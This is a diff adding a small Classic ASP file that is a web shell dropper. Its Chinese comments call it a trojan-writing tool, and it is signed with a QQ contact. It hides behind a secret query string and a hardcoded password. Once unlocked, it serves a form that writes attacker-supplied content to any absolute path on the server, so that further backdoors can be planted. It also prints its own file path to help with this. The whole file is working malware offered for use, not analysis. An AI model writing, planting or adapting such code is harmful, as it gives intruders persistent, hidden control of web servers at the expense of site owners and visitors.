@@ -1,0 +1,139 @@
+Const Password="wenshaoiloveyou"     '定义进入密码
+
+Const bl="hello"                '进入变量
+
+const m="world"                 '进入变量值,形如xxx.asp?hello=world
+
+'输出过程
+
+Sub Echo(sStr)
+
+  Response.Write sStr
+
+End Sub
+
+'登陆判断
+
+Sub PageLogin()
+
+  dim pwd,theAct
+
+  pwd=request.Form("pwd")
+
+  theAct=request.Form("theAct")
+
+       If theAct ="Login" Then
+
+       If Password = pwd Then
+
+    Session(m &amp; "Password") = Password
+
+    write()
+
+    Exit Sub
+
+       End If
+
+  end if
+
+  If Session(m &amp; "Password") = Password Then
+
+    write()
+
+   Exit Sub
+
+  End If
+
+  Echo "&lt;form method=post name=formx action=''&gt;"
+
+  Echo "&lt;input type=hidden name=theAct value=Login&gt;"
+
+  Echo "&lt;input name=pwd type=password style='border:1px solid #d8d8f0;background-color:#ffffff;'&gt; "
+
+  Echo "&lt;input type=submit value='login' style='border:1px solid #d8d8f0;background-color:#f9f9fd;'&gt;"
+
+  Echo "&lt;/form&gt;"
+
+End Sub
+
+'登陆后写马功能,转cyfd写的
+
+sub write()
+
+dim objFSO
+
+dim fdata
+
+dim objCountFile
+
+on error resume next
+
+Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
+
+if Trim(request("syfdpath"))&lt;&gt;"" then
+
+fdata = request("cyfddata")
+
+Set objCountFile=objFSO.CreateTextFile(request("syfdpath"),True)
+
+objCountFile.Write fdata
+
+if err =0 then
+
+Echo "保存成功"
+
+else
+
+Echo "保存失败"
+
+end if
+
+err.clear
+
+end if
+
+objCountFile.Close
+
+Set objCountFile=Nothing
+
+Set objFSO = Nothing
+
+Echo "&lt;form action='' method=post&gt;"
+
+Echo "保存文件的&lt;font color=red&gt;绝对路径(包括文件名:如D:\web\x.asp):&lt;/font&gt;"
+
+Echo "&lt;input type=text name=syfdpath width=32 size=50&gt;"
+
+Echo "&lt;br&gt;"
+
+Echo "本文件绝对路径"
+
+%&gt;
+
+&lt;%=server.mappath(Request.ServerVariables("SCRIPT_NAME"))%&gt;
+
+&lt;%
+
+Echo "&lt;br&gt;"
+
+Echo "输入马的内容:"
+
+Echo "&lt;textarea name=cyfddata cols=80 rows=10 width=32&gt;&lt;/textarea&gt;"
+
+Echo "&lt;input type=submit value=保存&gt;"
+
+Echo "&lt;/form&gt;"
+
+end sub
+
+If Request.QueryString(bl)=m then '判断进入是否是xxx.asp?hello=world这样格式
+
+PageLogin()
+
+else
+
+end if
+
+%&gt;
+-----------------------------------------------------------------------------------
+by:神秘来客QQ：437862467
